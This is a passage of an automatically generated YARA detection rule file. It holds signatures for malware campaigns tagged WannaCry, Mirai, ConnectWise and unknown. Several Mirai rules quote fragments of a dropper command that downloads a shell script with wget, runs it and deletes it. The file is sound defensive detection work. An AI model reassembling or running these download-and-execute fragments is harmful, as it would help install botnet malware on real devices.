        $s7 = "neprH8ycAIb64J3C5ZI0yFkLDbN2U+BkPA8otv1dADGEqxI1TtkOY/LcyNddDhyAW9gm4qf3MQyzclmKXbk8uEb3ZKFRmhGAUi+S" ascii
        $s8 = "DyMT7fZb9dEiBVHAXy2yWY9zFfWRngNlQqmfprJozjU4Swj1cOZm2o5ZsNR2I3Jz18uMEn/KJa3uiQuYeJnAafHVKLBstAgGITZS" ascii
        $s9 = "Fyf5GGvog1W2q80GVhaMfKbhFwpqCcgsDGcIISyPz1QXWJktidU9PN7yBFHUElW2kZFuk4LhQndbvNFK7Raj1sTQiOHy+Ke4/K1M" ascii
        $s10 = "937EHPiU2WTFl2sg/jZr95EkGp3mmUP8NAo68Fwi8C/4n+ycc0d2o7OyH76a75h9ofch0u50bz9pOnQVSN/KwyJtkqMNUKf8XaYv" ascii
        $s11 = "EClrZY+rdrFD5KQbp0qhYwgEls4ay1j31a+xkRP6TTMx8VvXUutIg1Gmd7i+sXAS6mY98lKee9NvMpJE7OavgZJbxo/kqwdZ5Tj1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 10596352 and 12 of them
}

rule Sightlines_rich_header_hash_003b7b80_wannacry
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign rich_header_hash-003b7b80"
        date = "2026-10-17"
        campaign = "rich_header_hash-003b7b80"
        family = "wannacry"
        hash = "78e25638e490f326551d803a608c0df0f7e5af2747f124078237301737f63b2b"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/rich_header_hash-003b7b80.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "C4OSmdKQrtN4zZnAShPGa3yLpqS3VvaD+W5IRkA9dhgJi1NlYPDhKQB2pr7GgprbLruE8xtGkqWGFtDoqzIXeXU3XV6NOsK7TlcH" ascii
        $s1 = "5DFOtJPRVbIPl8QOjm2IE1rwQt4AbVR2o6YK5pUGXNLCZxXroI8l+mQX3gudA56Bcb/I7hfyeWZy5zaWa5BRrI1Ss+7D3v9knvDj" ascii
        $s2 = "vLg7Z1Yr/AZ9TmVxAspk7OakT4SmzfidGCQHPD6qoQ41LMIIyKFqGsWQuDEw4x/9j8jbUm+8ebrYp2a8XGY1h3pcYKAJ7f3a9sPB" ascii
        $s3 = "hiYO7Q+UFFfP/bcJ4FTPy5qnpEnX6v+n88x+C1TSRKCzHZ9osGZF3WtNaDyBIirDNBcOtpV0TcMLaoZiSGg7YW1BrYdfwMKBsYuK" ascii
        $s4 = "7gHFD958N9Ikb/zj66YdRI/SIUt3c+fEPxFLLmSmOGQ8Rbpl1ytuv02fEoG4PhU8kVJ5BUKldbtJG23VlkEmWTKy+q2y1/e7injM" ascii
        $s5 = "H7HLnklZH1DscvSX0oEzLb9ao0qjflfyRGeFEnFbJrG/m/FawTW35AVy4Dzyj+eJQPeQjNUDpmYCF7lQg8Ogvik53rxqvui98Dhv" ascii
        $s6 = "7cnWqoHGHRhLihPuuXPs2N/CNUMOSGRjVyfio3Du9RtCB7FcJDdvvFHa343mSJsMQpYYNa+Tr+egbyulIVECrZUydjVmaPzw2sWi" ascii
        $s7 = "neprH8ycAIb64J3C5ZI0yFkLDbN2U+BkPA8otv1dADGEqxI1TtkOY/LcyNddDhyAW9gm4qf3MQyzclmKXbk8uEb3ZKFRmhGAUi+S" ascii
        $s8 = "DyMT7fZb9dEiBVHAXy2yWY9zFfWRngNlQqmfprJozjU4Swj1cOZm2o5ZsNR2I3Jz18uMEn/KJa3uiQuYeJnAafHVKLBstAgGITZS" ascii
        $s9 = "Fyf5GGvog1W2q80GVhaMfKbhFwpqCcgsDGcIISyPz1QXWJktidU9PN7yBFHUElW2kZFuk4LhQndbvNFK7Raj1sTQiOHy+Ke4/K1M" ascii
        $s10 = "937EHPiU2WTFl2sg/jZr95EkGp3mmUP8NAo68Fwi8C/4n+ycc0d2o7OyH76a75h9ofch0u50bz9pOnQVSN/KwyJtkqMNUKf8XaYv" ascii
        $s11 = "EClrZY+rdrFD5KQbp0qhYwgEls4ay1j31a+xkRP6TTMx8VvXUutIg1Gmd7i+sXAS6mY98lKee9NvMpJE7OavgZJbxo/kqwdZ5Tj1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 10596352 and 12 of them
}

rule Sightlines_imphash_1c2c9a7a_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-1c2c9a7a"
        date = "2026-10-17"
        campaign = "imphash-1c2c9a7a"
        family = ""
        hash = "3a62ba9d46cb84d3e77a2a45285c6b354bdd7a7944ca30ad6d486939b5a0a729"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-1c2c9a7a.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "{3E5FC7F9-9A51-4367-9063-A120244FBEC7}" wide
        $s1 = "Elevation:Administrator!new:" wide
        $s2 = "%s_%s_tempchunk_%d" ascii
        $s3 = "D$XHcD$DH;D$Xs" ascii
        $s4 = "D$(HcD$HHcL$(H" ascii
        $s5 = "D$@H;D$Xt8H" ascii
        $s6 = "D$PH;D$Xs^H" ascii
        $s7 = "D$HH;D$htqH" ascii
        $s8 = "D$d;D$hr7H" ascii
        $s9 = "D$p;D$tt#H" ascii
        $s10 = "$H;D$0sPH" ascii
        $s11 = "T$0HcD$(H" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1527808 and 12 of them
}

rule Sightlines_dotnet_typelib_guid_dbd841f4_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign dotnet_typelib_guid-dbd841f4"
        date = "2026-10-17"
        campaign = "dotnet_typelib_guid-dbd841f4"
        family = ""
        hash = "500eb5560aae4d3a4d7dc4c61a880906ed0231f1a636113f74778b86eaf979b1"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/dotnet_typelib_guid-dbd841f4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Cannot deserialize the current JSON object (e.g. {{\"name\":\"value\"}}) into type '{0}' because the typ" wide
        $s1 = "Cannot deserialize the current JSON array (e.g. [1,2,3]) into type '{0}' because the type requires a" wide
        $s2 = "Invalid extension data attribute on '{0}'. Member '{1}' type must implement IDictionary<string, JTok" wide
        $s3 = "Unexpected JSON token when reading DataTable. Expected StartArray, got {0}." wide
        $s4 = "System.Collections.Generic.IDictionary<System.String,Newtonsoft.Json.Linq.JToken>.get_Values" ascii
        $s5 = "Unexpected initial token '{0}' when populating object. Expected JSON object or array." wide
        $s6 = "Serialization Error Callback '{1}' in type '{0}' must have two parameters of type '{2}' and '{3}'." wide
        $s7 = "Expected Array token while parsing enum values, got {0}." wide
        $s8 = "<TryBuildImmutableForDictionaryContract>b__25_1" ascii
        $s9 = "System.Collections.Generic.IDictionary<System.String,Newtonsoft.Json.Linq.JToken>.Values" ascii
        $s10 = "MJsonNet35BinaryCompatibility will be removed in a future version of Json.NET." ascii
        $s11 = "Set JConstructor values with invalid key value: {0}. Argument position index expected." wide
    condition:
        uint16(0) == 0x5A4D and filesize < 1400672 and 12 of them
}

rule Sightlines_signer_cert_sha1_142898db_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-142898db"
        date = "2026-10-17"
        campaign = "signer_cert_sha1-142898db"
        family = ""
        hash = "500eb5560aae4d3a4d7dc4c61a880906ed0231f1a636113f74778b86eaf979b1"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-142898db.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Cannot deserialize the current JSON object (e.g. {{\"name\":\"value\"}}) into type '{0}' because the typ" wide
        $s1 = "Cannot deserialize the current JSON array (e.g. [1,2,3]) into type '{0}' because the type requires a" wide
        $s2 = "Invalid extension data attribute on '{0}'. Member '{1}' type must implement IDictionary<string, JTok" wide
        $s3 = "System.Collections.Generic.IDictionary<System.String,Newtonsoft.Json.Linq.JToken>.get_Values" ascii
        $s4 = "Unexpected initial token '{0}' when populating object. Expected JSON object or array." wide
        $s5 = "Serialization Error Callback '{1}' in type '{0}' must have two parameters of type '{2}' and '{3}'." wide
        $s6 = "Expected Array token while parsing enum values, got {0}." wide
        $s7 = "<TryBuildImmutableForDictionaryContract>b__25_1" ascii
        $s8 = "System.Collections.Generic.IDictionary<System.String,Newtonsoft.Json.Linq.JToken>.Values" ascii
        $s9 = "MJsonNet35BinaryCompatibility will be removed in a future version of Json.NET." ascii
        $s10 = "Set JConstructor values with invalid key value: {0}. Argument position index expected." wide
        $s11 = "<TryBuildImmutableForArrayContract>b__24_1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1400672 and 12 of them
}

rule Sightlines_tlsh_b418127d_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-b418127d"
        date = "2026-10-16"
        campaign = "tlsh-b418127d"
        family = ""
        hash = "4990471ba1fd42bececad78c413f546a6252feeb22f426bdb9407e7f50512695"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-b418127d.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "ion.ZipFile]::ExtractToDirectory('%_P%','%_R%')\" >nul 2>&1" ascii
        $s1 = "            powershell -NoProfile -Command \"$c=@(gc '%_R%\\python311._pth')-replace '#import site','i" ascii
        $s2 = "        powershell -NoProfile -Command \"Add-Type -A 'System.IO.Compression.FileSystem'; [IO.Compress" ascii
        $s3 = "if exist \"%_R%\\python.exe\" (\"%_R%\\python.exe\" main.py) else (python main.py)" ascii
        $s4 = "if not exist \"%_R%\\python.exe\" (" ascii
        $s5 = "chcp 65001 >nul" ascii
        $s6 = "@echo off" ascii
    condition:
        filesize < 1048576 and 7 of them
}

rule Sightlines_signer_cert_sha1_0420e5b8_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign signer_cert_sha1-0420e5b8"
        date = "2026-10-16"
        campaign = "signer_cert_sha1-0420e5b8"
        family = ""
        hash = "5b13c58fbf6eb3073f7a906cebc9148609eece5c451324541acfdc8ef6b45f3f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/signer_cert_sha1-0420e5b8.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "Yhttp://www.microsoft.com/pkiops/crl/Microsoft%20Windows%20Code%20Signing%20PCA%202024.crl0w" ascii
        $s1 = "[http://www.microsoft.com/pkiops/certs/Microsoft%20Windows%20Code%20Signing%20PCA%202024.crt0" ascii
        $s2 = "'Microsoft Windows Code Signing PCA 20240" ascii
        $s3 = "Microsoft Corporation100." ascii
        $s4 = "350623220401Z0_1" ascii
        $s5 = "260528185511Z0t1" ascii
        $s6 = "240808213623Z" ascii
        $s7 = "250529185511Z" ascii
        $s8 = "500507+5052770" ascii
        $s9 = "_0Oio=NA" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 7044816 and 10 of them
}

rule Sightlines_tlsh_a5943fe6_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-a5943fe6"
        date = "2026-10-16"
        campaign = "tlsh-a5943fe6"
        family = ""
        hash = "050084563e794755872cfe70b99a7654292674fbcf4a6dd11fdc7f2547af233c"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-a5943fe6.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "?_LogWorkItemCompleted@_TaskEventLogger@details@Concurrency@@QEAAXXZ" ascii
        $s1 = "?_Makeushloc@_Locimp@locale@std@@CAXAEBV_Locinfo@3@HPEAV123@PEBV23@@Z" ascii
        $s2 = "?_LogTaskExecutionCompleted@_TaskEventLogger@details@Concurrency@@QEAAXXZ" ascii
        $s3 = "?_IsNonBlockingThread@_Task_impl_base@details@Concurrency@@SA_NXZ" ascii
        $s4 = "?_LogScheduleTask@_TaskEventLogger@details@Concurrency@@QEAAX_N@Z" ascii
        $s5 = "?_LogWorkItemStarted@_TaskEventLogger@details@Concurrency@@QEAAXXZ" ascii
        $s6 = "?_LogTaskCompleted@_TaskEventLogger@details@Concurrency@@QEAAXXZ" ascii
        $s7 = "aAbBcCdDeFgGhHIjmMnprRStTuUVwWxXyYzZ" ascii
        $s8 = "?_CallInContext@_ContextCallback@details@Concurrency@@QEBAXV?$function@$$A6AXXZ@std@@_N@Z" ascii
        $s9 = "?_Makewloc@_Locimp@locale@std@@CAXAEBV_Locinfo@3@HPEAV123@PEBV23@@Z" ascii
        $s10 = "?_Makexloc@_Locimp@locale@std@@CAXAEBV_Locinfo@3@HPEAV123@PEBV23@@Z" ascii
        $s11 = "?register_callback@ios_base@std@@QEAAXP6AXW4event@12@AEAV12@H@ZH@Z" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1171744 and 11 of them
}

rule Sightlines_imphash_3c5e4aaa_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-3c5e4aaa"
        date = "2026-10-16"
        campaign = "imphash-3c5e4aaa"
        family = ""
        hash = "184146852727a9db4eea06178716bec3cdbb1015c911f6b0f915b184ad7775b2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-3c5e4aaa.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "svbfloat16" ascii
        $s1 = "svfloat16" ascii
        $s2 = "svfloat32" ascii
        $s3 = "svfloat64" ascii
        $s4 = "svuint16" ascii
        $s5 = "svuint32" ascii
        $s6 = "svuint64" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 1048576 and 7 of them
}

rule Sightlines_imphash_dd85b31b_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign imphash-dd85b31b"
        date = "2026-10-16"
        campaign = "imphash-dd85b31b"
        family = ""
        hash = "2c08e77f86b0953cffa505bdbe64e87ecb7c088db65d5acb9a2eee65a32565ef"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/imphash-dd85b31b.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "(Press Retry to debug the application - JIT must be enabled)" ascii
        $s1 = "failure, see the Visual C++ documentation on asserts" ascii
        $s2 = "api-ms-win-core-kernel32-legacy-l1-1-1.dll" ascii
        $s3 = "api-ms-win-core-processthreads-l1-1-0.dll" ascii
        $s4 = "api-ms-win-core-processenvironment-l1-1-0.dll" ascii
        $s5 = "api-ms-win-core-errorhandling-l1-1-0.dll" ascii
        $s6 = "api-ms-win-core-processthreads-l1-1-1.dll" ascii
        $s7 = "api-ms-win-core-libraryloader-l1-1-0.dll" ascii
        $s8 = "Assertion failed: %Ts, file %Ts, line %d" ascii
        $s9 = "api-ms-win-core-localization-l1-2-0.dll" ascii
        $s10 = "For information on how your program can cause an assertion" ascii
        $s11 = "api-ms-win-core-interlocked-l1-1-0.dll" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2746656 and 12 of them
}

rule Sightlines_tlsh_c828ccdf_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-c828ccdf"
        date = "2026-10-16"
        campaign = "tlsh-c828ccdf"
        family = ""
        hash = "2c08e77f86b0953cffa505bdbe64e87ecb7c088db65d5acb9a2eee65a32565ef"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-c828ccdf.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "(Press Retry to debug the application - JIT must be enabled)" ascii
        $s1 = "failure, see the Visual C++ documentation on asserts" ascii
        $s2 = "api-ms-win-core-kernel32-legacy-l1-1-1.dll" ascii
        $s3 = "api-ms-win-core-processthreads-l1-1-0.dll" ascii
        $s4 = "api-ms-win-core-processenvironment-l1-1-0.dll" ascii
        $s5 = "api-ms-win-core-errorhandling-l1-1-0.dll" ascii
        $s6 = "api-ms-win-core-processthreads-l1-1-1.dll" ascii
        $s7 = "api-ms-win-core-libraryloader-l1-1-0.dll" ascii
        $s8 = "Assertion failed: %Ts, file %Ts, line %d" ascii
        $s9 = "api-ms-win-core-localization-l1-2-0.dll" ascii
        $s10 = "For information on how your program can cause an assertion" ascii
        $s11 = "api-ms-win-core-interlocked-l1-1-0.dll" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 2746656 and 12 of them
}

rule Sightlines_tlsh_3a69bfcd_connectwise
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-3a69bfcd"
        date = "2026-10-16"
        campaign = "tlsh-3a69bfcd"
        family = "connectwise"
        hash = "10e851bd7fc8e17b390cb8ccedb4becbe1008ff37e6b327c761b2572f42ea5ab"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-3a69bfcd.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = " !\"#$%%&'()*+,-../0123456789:;<=>?@ABCDEFGHIJKLLMNOPQRSTUVWXY[]_`bdefhjlnprtvz|~" ascii
        $s1 = "  !\"\"##$%%&&'(())**+,,--.//00122334556677899::;<<==>??@@AABCCDDEFFGGHIIJJKLLMMNNOPPQQRSSTTUVVWWXXYZZ" ascii
        $s2 = "}{ywusqonkigfdb`^\\[YVVSRPMLJIGECB@?=;976431/.,+)(&$#! " wide
        $s3 = " \"#%&()+,.0134679:<>?ABDEGHJKMOPRSUVXY]`cfilorux|" wide
        $s4 = "24?69<>BNPREDHKMY_aTVX[]dftsihlnprvw$&($&(|{" wide
        $s5 = "394821E67B}NOT EXCLUDE_BACKSTAGE_SHELLScreenConnect.WindowsBackstageShell.exeFileManagerFiles{80C42F" ascii
        $s6 = "E1-27A8-4EB1-896F-161D3237D864}NOT EXCLUDE_FILE_MANAGERScreenConnect.WindowsFileManager.exeServiceFi" ascii
        $s7 = "B6E27BUseOriginalUrlEncoding#1regED314AE69CE5D835D523FB365C82C36B[URL_SCHEME]\\shell\\open\\command\"[IN" ascii
        $s8 = "ationPackage.dllCredentialProviderFiles{595C1B10-5F3C-42F7-B006-5D9C44DEC4FF}NOT EXCLUDE_CREDENTIAL_" ascii
        $s9 = "TNetFramework40ClientCustomActionLibraryWixCAMainFiles{E0EF5F66-7B92-40DE-8B20-EB91E1C859BB}INSTALLL" ascii
        $s10 = "ntVersion\\Authentication\\Credential Providers\\[CREDENTIAL_PROVIDER_CLASS_ID]reg685500C4A1A36BBDF1BB3" ascii
        $s11 = "ll]reg86A6324C5FADB6CB634CB54F9A254136CLSID\\[CREDENTIAL_PROVIDER_CLASS_ID][ProductName] Credential P" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 11375920 and 12 of them
}

rule Sightlines_tlsh_31dd621e_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-31dd621e"
        date = "2026-10-16"
        campaign = "tlsh-31dd621e"
        family = "mirai"
        hash = "103a43615769b391c9db64c43d48b02247da7563f15ec5f7e5ec8c9ee24715c7"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-31dd621e.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,diffie-hellman-" ascii
        $s1 = "mig.sh http://$H/bins/kla.sh 2>/dev/null ||    busybox wget -q -O .mig.sh http://$H/bins/kla.sh 2>/d" ascii
        $s2 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s3 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s4 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s5 = "chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@ope" ascii
        $s6 = "group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group14-sha256" ascii
        $s7 = "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8" ascii
        $s8 = "en sh .mig.sh 2>/dev/null; rm -f .mig.sh 2>/dev/null; break; fi; done; rm -f .mig.sh 2>/dev/null" ascii
        $s9 = "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3" ascii
        $s10 = "umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@ope" ascii
        $s11 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_563f36e7_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-563f36e7"
        date = "2026-10-16"
        campaign = "tlsh-563f36e7"
        family = "mirai"
        hash = "00d0db4d3dbc46ce64f493b6d0df48a2c8e3b2c4c514a1f5159b8d2c8828cb8f"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-563f36e7.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,diffie-hellman-" ascii
        $s1 = "mig.sh http://$H/bins/kla.sh 2>/dev/null ||    busybox wget -q -O .mig.sh http://$H/bins/kla.sh 2>/d" ascii
        $s2 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s3 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s4 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s5 = "chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@ope" ascii
        $s6 = "group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group14-sha256" ascii
        $s7 = "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8" ascii
        $s8 = "en sh .mig.sh 2>/dev/null; rm -f .mig.sh 2>/dev/null; break; fi; done; rm -f .mig.sh 2>/dev/null" ascii
        $s9 = "SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3" ascii
        $s10 = "umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@ope" ascii
        $s11 = "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_cb1511c4_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-cb1511c4"
        date = "2026-10-16"
        campaign = "tlsh-cb1511c4"
        family = "mirai"
        hash = "564b6ed7237dc4aee58af9054621ced2c5ae4fc1d2673d9735c6457b6be9d6c2"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-cb1511c4.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows" ascii
        $s1 = "GCC: (GNU) 3.3.2 20031005 (Debian prerelease)" ascii
        $s2 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/ieee754-df.S" ascii
        $s3 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/lib1funcs.asm" ascii
        $s4 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/pr-support.c" ascii
        $s5 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/libunwind.S" ascii
        $s6 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/unwind-arm.c" ascii
        $s7 = "/home/landley/aboriginal/aboriginal/build/simple-cross-compiler-armv7l/bin/../cc/include" ascii
        $s8 = "ST: urn:dial-multiscreen-org:service:dial:1" ascii
        $s9 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/build-gcc/gcc" ascii
        $s10 = "__do_global_dtors_aux_fini_array_entry" ascii
        $s11 = "phase2_call_unexpected_after_unwind" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_5b7aa1cb_mirai
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-5b7aa1cb"
        date = "2026-10-16"
        campaign = "tlsh-5b7aa1cb"
        family = "mirai"
        hash = "8ca1337be559848cd3239f6f0fb35f31be98dddab1c003e6b57722dd3ae28e95"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-5b7aa1cb.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,diffie-hellman-" ascii
        $s1 = "mig.sh http://$H/bins/kla.sh 2>/dev/null ||    busybox wget -q -O .mig.sh http://$H/bins/kla.sh 2>/d" ascii
        $s2 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" ascii
        $s3 = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ascii
        $s4 = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" ascii
        $s5 = "chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@ope" ascii
        $s6 = "group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group14-sha256" ascii
        $s7 = "text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8" ascii
        $s8 = "GCC: (GNU) 3.3.2 20031005 (Debian prerelease)" ascii
        $s9 = "en sh .mig.sh 2>/dev/null; rm -f .mig.sh 2>/dev/null; break; fi; done; rm -f .mig.sh 2>/dev/null" ascii
        $s10 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/ieee754-df.S" ascii
        $s11 = "/home/landley/aboriginal/aboriginal/build/temp-armv7l/gcc-core/gcc/config/arm/lib1funcs.asm" ascii
    condition:
        uint32(0) == 0x464C457F and filesize < 1048576 and 12 of them
}

rule Sightlines_tlsh_4562e960_wannacry
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-4562e960"
        date = "2026-10-16"
        campaign = "tlsh-4562e960"
        family = "wannacry"
        hash = "b2f356e15402e11fb6292b91a97f7f9a8f15cb323c5d43423b01bee04eef2746"
        reference = "https://sourcediver42.github.io/sightlines/campaigns/tlsh-4562e960.json"
        license = "Detection Rule License (DRL) 1.1"
    strings:
        $s0 = "C4OSmdKQrtN4zZnAShPGa3yLpqS3VvaD+W5IRkA9dhgJi1NlYPDhKQB2pr7GgprbLruE8xtGkqWGFtDoqzIXeXU3XV6NOsK7TlcH" ascii
        $s1 = "5DFOtJPRVbIPl8QOjm2IE1rwQt4AbVR2o6YK5pUGXNLCZxXroI8l+mQX3gudA56Bcb/I7hfyeWZy5zaWa5BRrI1Ss+7D3v9knvDj" ascii
        $s2 = "vLg7Z1Yr/AZ9TmVxAspk7OakT4SmzfidGCQHPD6qoQ41LMIIyKFqGsWQuDEw4x/9j8jbUm+8ebrYp2a8XGY1h3pcYKAJ7f3a9sPB" ascii
        $s3 = "hiYO7Q+UFFfP/bcJ4FTPy5qnpEnX6v+n88x+C1TSRKCzHZ9osGZF3WtNaDyBIirDNBcOtpV0TcMLaoZiSGg7YW1BrYdfwMKBsYuK" ascii
        $s4 = "7gHFD958N9Ikb/zj66YdRI/SIUt3c+fEPxFLLmSmOGQ8Rbpl1ytuv02fEoG4PhU8kVJ5BUKldbtJG23VlkEmWTKy+q2y1/e7injM" ascii
        $s5 = "H7HLnklZH1DscvSX0oEzLb9ao0qjflfyRGeFEnFbJrG/m/FawTW35AVy4Dzyj+eJQPeQjNUDpmYCF7lQg8Ogvik53rxqvui98Dhv" ascii
        $s6 = "7cnWqoHGHRhLihPuuXPs2N/CNUMOSGRjVyfio3Du9RtCB7FcJDdvvFHa343mSJsMQpYYNa+Tr+egbyulIVECrZUydjVmaPzw2sWi" ascii
        $s7 = "neprH8ycAIb64J3C5ZI0yFkLDbN2U+BkPA8otv1dADGEqxI1TtkOY/LcyNddDhyAW9gm4qf3MQyzclmKXbk8uEb3ZKFRmhGAUi+S" ascii
        $s8 = "DyMT7fZb9dEiBVHAXy2yWY9zFfWRngNlQqmfprJozjU4Swj1cOZm2o5ZsNR2I3Jz18uMEn/KJa3uiQuYeJnAafHVKLBstAgGITZS" ascii
        $s9 = "Fyf5GGvog1W2q80GVhaMfKbhFwpqCcgsDGcIISyPz1QXWJktidU9PN7yBFHUElW2kZFuk4LhQndbvNFK7Raj1sTQiOHy+Ke4/K1M" ascii
        $s10 = "937EHPiU2WTFl2sg/jZr95EkGp3mmUP8NAo68Fwi8C/4n+ycc0d2o7OyH76a75h9ofch0u50bz9pOnQVSN/KwyJtkqMNUKf8XaYv" ascii
        $s11 = "EClrZY+rdrFD5KQbp0qhYwgEls4ay1j31a+xkRP6TTMx8VvXUutIg1Gmd7i+sXAS6mY98lKee9NvMpJE7OavgZJbxo/kqwdZ5Tj1" ascii
    condition:
        uint16(0) == 0x5A4D and filesize < 10596352 and 12 of them
}

rule Sightlines_tlsh_43a73e68_unknown
{
    meta:
        author = "Sightlines (automatically generated)"
        description = "Strings shared by the samples of campaign tlsh-43a73e68"
        date = "2026-10-16"
        campaign = "tlsh-43a73e68"
        family = ""
        hash = "4d0f30ffa45b6abfd3fef9e128aa45ac5bee029b264b816c3cd13ab7955a3815"
